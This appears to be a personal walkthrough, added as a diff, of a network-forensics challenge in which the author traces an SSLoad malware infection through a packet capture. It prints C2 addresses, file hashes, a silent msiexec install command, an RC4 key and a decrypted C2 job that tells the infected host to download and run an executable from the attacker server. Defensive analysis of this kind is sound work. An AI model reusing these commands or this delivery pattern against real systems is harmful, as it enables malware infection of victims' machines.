@@ -1,0 +1,58 @@
+Its a pcap, open it up.
+
+Task 1: What IP address did the original suspicious traffic come from?
+> went and looked for export objects in http, and found 2 suspects domains. One of which is an odd one though which is related to grabbing a bunch of files. Its domain is krd6.com, and the public IP we can find is 87.249.49.206, the Destination IP is our victim host.
+> Wrong actually. The one other IP we can see is 85.239.53.219, which does some POST requests among other things. The hallmark here to assume is that its some ghetto public server that an attacker is hosting.
+> Nuh uh. It was actually the SOURCE address the whole time, and not a particular server. The Source IP we were following the whole time was 10.4.17.101.
+
+Task 2 was very odd since i found it before Task 1, PROPFIND method was used against the '/share' folder to get some properties of the file.
+
+Task 3 can be done by filtering for the PROPFIND method w/ http.request.method == "PROPFIND". We get back a few hits and see two files in the share directory; Desktop.ini and avp.msi. avp.msi is hinted at in the answer field!
+
+Task 4 requires us to look this malware up on VirusTotal. We can download the file under Export Objects in wireshark by matching the filename and uploading it to VirusTotal. It is not shown as malware, but we can still get the SSDEEP hash: 
+12:TMHdRO24bT671FB9Bp/UHwV/49UrypInprb6zzvWnWWSzziQ1nWWSZuCq9JOdfjn:2dROF671FB9BpMoQn6n9E2Z1j. Somehow this is not the answer?????????????? The format is totally diff.
+
+> Plot twist there are two avp.msi files HOWEVER these are the queried XML bits from the PROPFIND calls. There is one real avp.msi file which is >1MB. It's hash is: 
+24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz.
+
+Task 5 is shrimple. Its family is: ssload
+
+Task 6 is ez. Creation Time is listed under Details: 2009-12-11 11:47:44.
+
+Task 7 can be easily solved by checking Contacted Domains under Relations: api.ipify.org.
+
+Task 8 is ez. The IP used for communication is: 85.239.53.219, also found under Relations.
+
+Task 9 appears iffy BUT we can see under Dropped Files under Relations, that one of the dropped files is a DLL, named 
+forcedelctl.dll.
+
+Task 10 is odd but very solvable w/ VirusTotal. Under the Behaviour tab, scroll until you reach File System Actions, we can see msiexec.exe is referenced; the only executable referencing anything to do w/ execution lol. It is ran whenever an .msi file is ran, but in this case, it was maybe used to run the malware? We can actually see later down the page, that a process was created w/ msiexec: "C:\Windows\system32\msiexec.exe" /I "C:\Users\<USER>\AppData\Local\Temp\avp.msi" /qb ACCEPTEULA=1 LicenseAccepted=1. Ez stuff.
+
+Task 11 is also odd, but solvable. Returning to the PCAP, we can recall past machines, in that checking DHCP traffic can show hostnames for machines. We want the hostname for 10.4.17.101.
+> This actually gave us nothing. On a whim though, We can search for a WIndows hostname, since we know a Windows machine was compromised since .msi files were used, we can use the 'ip contains "DESKTOP-"' filter to check for common/auto-generated hostnames. Wouldn't ya know it, we can see an API request w/ the contacted IP of the malware and get a TON of info from the API, including os version, owner, current user, etc. 
+> Among this info, we can see the hostname is: DESKTOP-FWQ3U4C.
+
+Task 12 is really weird and poorly worded. What key bruh? 
+> Real simple actually LOL. If we go ahead and follow the HTTP stream, we can IMMEDIATELY see after the API request that a key was shared in PLAINTEXT: WkZPxBoH6CA3Ok4iI
+
+Task 13 is ez. OS version was given back in API response: Windows 6.3.9600.
+
+Task 14 is also ez. Owner is: Nevada, shown in API response too!
+
+Lastly, Task 15 is not too tricky. We can see that there is a "job" parameter sent back in a response to the compromised host as an obfuscated command: "B//jOYkMjUR2wj+L/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9sY0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA==".
+
+---
+
+Doing a bit more digging + skipping ahead, after many hours of AI and going crazy, I come across a report talking about SSLoad malware, which is the family of malware we were looking at: https://www.netwitness.com/modules/firstwatch-intelligence/firstwatch-threat-spotlight-unraveling-ssload-a-multi-stage-malware-menace/
+
+Scroll down and we can see the following line: "If the C2 server has a task for the infected host, it responds with a JSON structure containing a “job” and another unique identifier for the job. The job is an RC4-encrypted struct encoded as a Base64 string containing two fields: a “command” and an array of arguments."
+
+omagash, decryption? Loading up cyberchef, we can run the following decryption recipe:
+> RC4 w/ the Key, output format set as Base64
+> From base64
+
+We get rubbish HOWEVER CyberChef the goat suggests to apply Base64 at the beginning to get the final output:
+
+{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
+
+GEE GEE
